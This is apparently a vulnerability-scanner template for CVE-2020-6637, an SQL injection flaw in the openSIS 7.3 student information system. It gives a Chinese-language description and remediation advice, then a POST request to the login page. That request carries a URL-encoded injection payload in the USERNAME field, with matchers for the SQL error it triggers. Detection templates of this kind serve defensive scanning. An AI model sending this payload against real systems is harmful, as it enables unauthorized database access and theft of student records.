id: CVE-2020-6637
info:
  name: OpenSIS 7.3 - SQL Injection
  author:
  - pikpikcu
  description: "Open Solutions for Education openSIS SQL注入漏洞 \n Open Solutions for
    Education openSIS是美国Open Solutions for Education公司的一套开源的学生信息管理系统。\n\nopenSIS Community
    Edition 7.3版本存在SQL注入漏洞，该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 "
  severity: critical
  remediation: |-
    官方修复方案：<br />1、升级系统至无漏洞版本，或于官网下载安全补丁。
    https://opensis.com/
    临时修复方案：<br />1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。<br />2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。<br />3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。<br />4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。<br />5、网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。<br />6、严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。<br />7、避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。<br />8、过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。
requests:
- matchers:
  - type: word
    condition: and
    part: body
    words:
    - 'SQL STATEMENT:'
    - <TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;--
      -')</TD>
  - type: word
    condition: and
    part: header
    words:
    - text/html
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/account/index.php'
  - '{{BaseURL}}/opensis/index.php'
  - '{{BaseURL}}/index.php'
  method: POST
  body: |
    USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=
  headers:
    Content-Type: application/x-www-form-urlencoded
